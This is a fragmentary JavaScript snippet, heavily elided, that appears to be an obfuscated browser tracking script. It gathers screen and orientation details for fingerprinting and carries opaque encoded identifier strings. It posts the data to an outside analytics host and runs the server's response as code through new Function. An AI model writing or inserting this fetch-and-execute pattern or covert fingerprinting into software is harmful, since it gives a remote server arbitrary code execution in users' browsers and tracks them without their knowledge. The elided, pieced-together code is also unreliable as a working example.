...
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tpmJlpa2yTbGuZYpVslXCbaWdcU9GGb2iaYlmtW5yWmGaUlGpsa5NrYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2dpl2VomJVommuUaGllmm9wZw==');
...
this.request.post('//api.tongjiniao.com/r?t=1741043316&p=755324175714938880', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
    ...
    if (!v) {
        v = 'bmyZl5WWZp1mcGlna5lsaWxlkmVsbGlqYGVjkZI='
    }
...
sid: function (k, v) {
    ...
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxqZpZraWllmWmYam1okQ=='
    }
